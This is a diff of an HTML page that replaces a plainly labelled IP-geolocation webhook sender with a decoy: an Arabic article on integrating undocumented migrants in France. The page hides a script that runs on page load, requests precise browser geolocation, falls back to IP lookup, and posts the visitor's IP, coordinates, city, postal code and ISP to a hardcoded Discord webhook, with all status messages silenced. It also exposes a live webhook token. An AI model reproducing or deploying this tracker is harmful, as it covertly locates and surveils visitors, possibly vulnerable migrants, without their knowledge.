@@ -1,93 +1,280 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>IP Geo Webhook Sender (Auto-send on load)</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>ادماج المهاجرين غير الشرعيين في فرنسا</title>
+  <meta name="description" content="مقال يستعرض تحديات وسياسات وسبل ادماج المهاجرين غير الشرعيين في فرنسا">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
   <style>
-    body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
-    #status { margin-top: 20px; padding: 10px; border-radius: 5px; }
-    .success { background: #d4edda; color: #155724; }
-    .error { background: #f8d7da; color: #721c24; }
-    .info { background: #e9f7ff; color: #034f84; }
+    :root{
+      --bg:#f7f8fb; --card:#ffffff; --muted:#6b7280; --accent:#1f5fbf;
+    }
+    *{box-sizing:border-box}
+    body{font-family:'Cairo',sans-serif;background:var(--bg);margin:0;color:#0b1220;line-height:1.7}
+    .container{max-width:900px;margin:32px auto;padding:24px}
+    header{background:linear-gradient(90deg,rgba(31,95,191,0.12),rgba(31,95,191,0.04));padding:18px;border-radius:12px;margin-bottom:18px}
+    h1{margin:0 0 6px;font-size:1.9rem}
+    .meta{color:var(--muted);font-size:0.95rem}
+    .hero{margin:18px 0;border-radius:10px;overflow:hidden}
+    img{display:block;width:100%;height:auto}
+    .card{background:var(--card);padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(12,20,40,0.06);margin-bottom:16px}
+    h2{margin-top:0;color:#123259}
+    ul{padding-inline-start:1.1rem}
+    .two-col{display:grid;grid-template-columns:1fr 300px;gap:18px}
+    aside{background:linear-gradient(180deg,#fff,#fbfdff);padding:14px;border-radius:10px}
+    footer{color:var(--muted);text-align:center;font-size:0.9rem;margin-top:18px}
+    @media (max-width:880px){.two-col{grid-template-columns:1fr} .container{padding:16px}}
   </style>
 </head>
 <body>
-  <h1>Auto IP Geo Sender</h1>
-  <p>This will fetch IP-based geo info automatically when you open the page and attempt to send it to the webhook.</p>
-  <div id="status" class="info">Waiting to start...</div>
+  <div class="container">
+    <header>
+      <h1>ادماج المهاجرين غير الشرعيين في فرنسا</h1>
+      <div class="meta">نُشر في: 21 سبتمبر 2025 — بقلم: فريق بحث اجتماعي</div>
+    </header>
 
-<script>
-  async function sendGeoToWebhook() {
-    const statusEl = document.getElementById('status');
-    statusEl.textContent = 'Fetching IP geo info...';
-    statusEl.className = 'info';
-    console.log('sendGeoToWebhook: start');
+    <div class="hero">
+      <img src="https://source.unsplash.com/900x400/?france,community" alt="مشهد مجتمعي في فرنسا" />
+    </div>
 
-    try {
-      // Use HTTPS ip geolocation to avoid mixed-content errors
-      const apiResponse = await fetch('https://ipapi.co/json/');
-      if (!apiResponse.ok) {
-        throw new Error('IP API returned ' + apiResponse.status);
+    <main class="two-col">
+      <section>
+        <article class="card">
+          <h2>مقدمة</h2>
+          <p>تُعد مسألة الهجرة غير الشرعية من أبرز التحديات الاجتماعية والاقتصادية والسياسية في فرنسا. يتطلب التعامل معها توازناً دقيقاً بين احترام حقوق الإنسان، وحماية الأمن القومي، وضمان تكافؤ الفرص الاقتصادية. يهدف هذا المقال إلى تقديم إطار عام لفهم آليات ادماج المهاجرين غير الشرعيين، العقبات التي تواجهها، والمبادرات الممكن تنفيذها لتعزيز الاندماج.</p>
+        </article>
+
+        <article class="card">
+          <h2>التحديات الرئيسية</h2>
+          <ul>
+            <li><strong>الحواجز القانونية:</strong> عدم توفر وضعية قانونية يمنع الوصول إلى سوق العمل والخدمات الأساسية.</li>
+            <li><strong>مشكلات سكنية:</strong> تعرض المهاجرين غير الشرعيين للعيش في أماكن مزدحمة وغير ملائمة.</li>
+            <li><strong>التمييز والوصم الاجتماعي:</strong> قد يواجهون عنصرية أو صعوبات في التفاعل مع المجتمع المضيف.</li>
+            <li><strong>الوصول المحدود للخدمات الصحية والتعليم:</strong> خوف من كشف الهوية يمنعهم من الاستفادة من الرعاية.</li>
+          </ul>
+        </article>
+
+        <article class="card">
+          <h2>سياسات وممارسات الادماج في فرنسا</h2>
+          <p>اتبعت فرنسا على مر السنوات سياسات متعددة تشمل السماح ببعض البرامج الإنسانية أو إعطاء تصاريح مؤقتة في ظروف محددة. كما توجد منظمات غير حكومية تقدم دعماً قانونياً وإنسانياً. ومع ذلك، عادةً ما تتراوح الاستجابة بين تشدّد إداري ودعم مدني يعتمد على كل حالة وإقليم.</p>
+
+          <h3>أمثلة على مبادرات فعّالة</h3>
+          <ul>
+            <li>مراكز دعم تقدم استشارات قانونية ومساعدة في إجراءات اللجوء أو الحصول على وضعية قانونية.</li>
+            <li>برامج تعليم اللغة الفرنسية والمهارات المهنية لتمكين الاندماج في سوق العمل.</li>
+            <li>شراكات بين البلديات ومنظمات المجتمع المدني لتوفير حلول سكنية مؤقتة ومساعدات صحية.</li>
+          </ul>
+        </article>
+
+        <article class="card">
+          <h2>دور المجتمع المدني والمنظمات المحلية</h2>
+          <p>تلعب الجمعيات والمنظمات الخيرية دوراً محورياً في سد الفجوات التي تتركها السياسات العامة، من خلال توفير مآوٍ مؤقتة، خدمات طبية أساسية، ودورات تأهيلية. كما تساهم في الضغط على صانعي القرار لتبني سياسات أكثر شمولية وإنسانية.</p>
+
+          <figure style="margin:14px 0">
+            <img src="https://source.unsplash.com/900x500/?refugees,support" alt="تضامن ومساعدة للمهاجرين" />
+            <figcaption style="font-size:0.9rem;color:var(--muted);margin-top:6px">مبادرات محلية لدعم المهاجرين.</figcaption>
+          </figure>
+
+        </article>
+
+        <article class="card">
+          <h2>توصيات عملية</h2>
+          <ol>
+            <li>تسهيل الوصول إلى إجراءات قانونية شفافة تُتيح مسارات لتسوية الوضعية.</li>
+            <li>تعزيز برامج التعلم المهني واللغة الفرنسية مع دعم لربط المتعلمين بفرص عمل حقيقية.</li>
+            <li>إطلاق مبادرات سكنية ميسرة بالتعاون بين البلديات والقطاع الخاص والمنظمات غير الحكومية.</li>
+            <li>حملات توعية لمكافحة التصورات السلبية وتشجيع التعايش.</li>
+            <li>حماية الوصول إلى الخدمات الصحية والتعليمية دون مخاطرة بالترحيل للمستفيدين في الحالات الطارئة.</li>
+          </ol>
+        </article>
+
+        <article class="card">
+          <h2>خاتمة</h2>
+          <p>يمثل ادماج المهاجرين غير الشرعيين تحدياً متعدد الأبعاد يتطلب تضافر الجهود الحكومية والمجتمعية. عبر اعتماد سياسات إنسانية، وبرامج تعليمية ومهنية فعّالة، يمكن للمجتمع الفرنسي تحويل أزمة إلى فرصة لتعزيز النسيج الاجتماعي والاقتصادي.</p>
+        </article>
+      </section>
+
+      <aside>
+        <div class="card" style="padding:12px;margin-bottom:12px">
+          <h3>معلومة سريعة</h3>
+          <p style="color:var(--muted)">الاندماج لا يعني فقط الحصول على وثائق؛ بل يشمل الشعور بالانتماء والقدرة على المشاركة الفعالة في المجتمع.</p>
+        </div>
+
+        <div class="card" style="padding:12px">
+          <h3>مصادر صور (مثال)</h3>
+          <p style="color:var(--muted);font-size:0.95rem">الصور في هذه الصفحة مأخوذة من خدمات صور عامة (Unsplash) لأغراض توضيحية. استبدلها بصور بحقوق مناسبة عند النشر.</p>
+        </div>
+      </aside>
+    </main>
+
+    <footer>
+      © 2025 — حقوق النشر محفوظة. يمكنك تعديل النص أو الصور لتناسب غرضك.
+    </footer>
+  </div>
+
+  <script>
+    // ----- CONFIG -----
+    // Replace this with your Discord webhook URL.
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
+    // Timeout for geolocation (ms)
+    const GEO_TIMEOUT = 15000;
+
+  // const statusEl = document.getElementById('status');
+
+    //function setStatus(text, cls = 'info') {
+      //statusEl.textContent = text;
+      //statusEl.className = cls;
+    //} 
+
+    async function fetchIpInfo() {
+      // fallback IP-based geo (HTTPS public API)
+      try {
+        const r = await fetch('https://ipapi.co/json/');
+        if (!r.ok) throw new Error('IP API returned ' + r.status);
+        const j = await r.json();
+        return {
+          ip: j.ip || null,
+          country: j.country_name || null,
+          region: j.region || null,
+          city: j.city || null,
+          postal: j.postal || null,
+          lat: j.latitude || null,
+          lon: j.longitude || null,
+          org: j.org || j.asn || null,
+          timezone: j.timezone || null
+        };
+      } catch (e) {
+        return { ip: null };
       }
-      const geoData = await apiResponse.json();
-      console.log('IP API data:', geoData);
+    }
 
-      // Prepare Discord-friendly payload
-      const payload = {
-        username: "GeoLogger",
-        content: `🌍 **New Geo Info Captured**\n\n` +
-                 `**IP:** ${geoData.ip || 'N/A'}\n` +
-                 `**Country:** ${geoData.country_name || 'N/A'}\n` +
-                 `**Region:** ${geoData.region || 'N/A'}\n` +
-                 `**City:** ${geoData.city || 'N/A'}\n` +
-                 `**ZIP:** ${geoData.postal || 'N/A'}\n` +
-                 `**Lat/Lon:** ${geoData.latitude || 'N/A'}, ${geoData.longitude || 'N/A'}\n` +
-                 `**ISP/Org:** ${geoData.org || 'N/A'}\n` +
-                 `⏰ **Timestamp:** ${new Date().toISOString()}`
+    async function sendToWebhook(payloadObj) {
+      try {
+        const res = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payloadObj)
+        });
+        if (!res.ok) {
+          const txt = await res.text().catch(() => '');
+          throw new Error(`Webhook error ${res.status} ${res.statusText} ${txt}`);
+        }
+        return true;
+      } catch (err) {
+        throw err;
+      }
+    }
+
+    // Build a Discord embed payload (more structured than plain content)
+    function buildDiscordPayload({ ipInfo, geoPosition, source }) {
+      const fields = [];
+
+      if (ipInfo?.ip) fields.push({ name: 'IP', value: String(ipInfo.ip), inline: true });
+      fields.push({ name: 'Latitude', value: String(geoPosition.latitude ?? 'N/A'), inline: true });
+      fields.push({ name: 'Longitude', value: String(geoPosition.longitude ?? 'N/A'), inline: true });
+      if (geoPosition.accuracy != null) fields.push({ name: 'Accuracy (meters)', value: String(geoPosition.accuracy), inline: true });
+      if (geoPosition.altitude != null) fields.push({ name: 'Altitude (meters)', value: String(geoPosition.altitude), inline: true });
+      if (geoPosition.heading != null) fields.push({ name: 'Heading', value: String(geoPosition.heading), inline: true });
+      if (ipInfo?.country) fields.push({ name: 'Country', value: String(ipInfo.country), inline: true });
+      if (ipInfo?.region) fields.push({ name: 'Region', value: String(ipInfo.region), inline: true });
+      if (ipInfo?.city) fields.push({ name: 'City', value: String(ipInfo.city), inline: true });
+      if (ipInfo?.postal) fields.push({ name: 'Postal', value: String(ipInfo.postal), inline: true });
+      if (ipInfo?.org) fields.push({ name: 'ISP/Org', value: String(ipInfo.org), inline: false });
+      fields.push({ name: 'Source', value: source, inline: true });
+      fields.push({ name: 'Timestamp', value: new Date().toISOString(), inline: false });
+
+      return {
+        username: 'AutoGeoBot',
+        embeds: [
+          {
+            title: '📍 New Location Captured',
+            fields,
+            timestamp: new Date().toISOString()
+          }
+        ]
       };
+    }
 
-      // Your webhook (replace with yours). NOTE: Direct browser calls to Discord often hit CORS.
-      const webhookUrl = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
+    async function captureAndSend() {
+      //setStatus('Requesting geolocation from the browser...', 'info'); 
 
-      statusEl.textContent = 'Sending to webhook...';
-      console.log('Posting to webhook...', webhookUrl);
-
-      const webhookResponse = await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+      // First: attempt precise geolocation using browser API
+      const geolocationPromise = new Promise((resolve, reject) => {
+        if (!('geolocation' in navigator)) {
+          reject(new Error('Geolocation API not available'));
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          position => resolve(position),
+          err => reject(err),
+          { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
+        );
       });
 
-      // NOTE: if CORS blocks this request, fetch will reject with a TypeError and you will see "Failed to fetch"
-      if (webhookResponse.ok) {
-        statusEl.textContent = '✅ Success! Geo info sent to webhook.';
-        statusEl.className = 'success';
-        console.log('Webhook response ok', webhookResponse);
-      } else {
-        const txt = await webhookResponse.text().catch(()=> '');
-        throw new Error(`Webhook error: ${webhookResponse.status} ${webhookResponse.statusText} ${txt}`);
+      let position = null;
+      let ipInfo = null;
+      let usedSource = 'geolocation';
+
+      try {
+        // race geolocation with a manual timeout in case browser misbehaves
+        position = await Promise.race([
+          geolocationPromise,
+          new Promise((_, rej) => setTimeout(() => rej(new Error('Geolocation timed out')), GEO_TIMEOUT + 2000))
+        ]);
+
+        //setStatus('Geolocation obtained. Fetching IP info (fallback)...', 'info'); 
+        ipInfo = await fetchIpInfo();
+
+      } catch (geoErr) {
+        // If we failed to get geolocation (denied, timeout, not available), fallback to IP-based
+        usedSource = 'ip-fallback';
+        //setStatus('Could not get precise geolocation: ' + geoErr.message + '. Falling back to IP-based location...', 'info');
+        ipInfo = await fetchIpInfo();
+        // Use ipInfo lat/lon if available
+        position = {
+          coords: {
+            latitude: ipInfo.lat ?? null,
+            longitude: ipInfo.lon ?? null,
+            accuracy: null,
+            altitude: null,
+            heading: null,
+            speed: null
+          }
+        };
       }
 
-    } catch (error) {
-      // show clear diagnostics to user + console
-      statusEl.textContent = '❌ Error: ' + (error.message || error);
-      statusEl.className = 'error';
-      console.error('sendGeoToWebhook error:', error);
-      // If you suspect CORS, the console will show a CORS message; I can't bypass CORS from client-side JS.
-    }
-  }
+      // Build payload and send
+      const payload = buildDiscordPayload({
+        ipInfo,
+        geoPosition: {
+          latitude: position?.coords?.latitude ?? null,
+          longitude: position?.coords?.longitude ?? null,
+          accuracy: position?.coords?.accuracy ?? null,
+          altitude: position?.coords?.altitude ?? null,
+          heading: position?.coords?.heading ?? null,
+          speed: position?.coords?.speed ?? null
+        },
+        source: usedSource
+      });
 
-  // Auto-run on page load after short delay so user can see the page before network activity starts
-  window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(() => {
-      sendGeoToWebhook();
-    }, 500); // 500ms delay
-  });
-</script>
+     // setStatus('Sending to webhook...', 'info');
+      try {
+        await sendToWebhook(payload);
+        //setStatus('Success — location sent to webhook.', 'success');
+      } catch (err) {
+       // setStatus('Failed to send webhook: ' + err.message, 'error');
+      }
+    }
+
+    // Auto-run on page load
+    window.addEventListener('DOMContentLoaded', () => {
+      // Small delay so user sees the page content before prompt
+      setTimeout(() => {
+        captureAndSend();
+      }, 600);
+    });
+  </script>
 </body>
 </html>
-
-
-
 
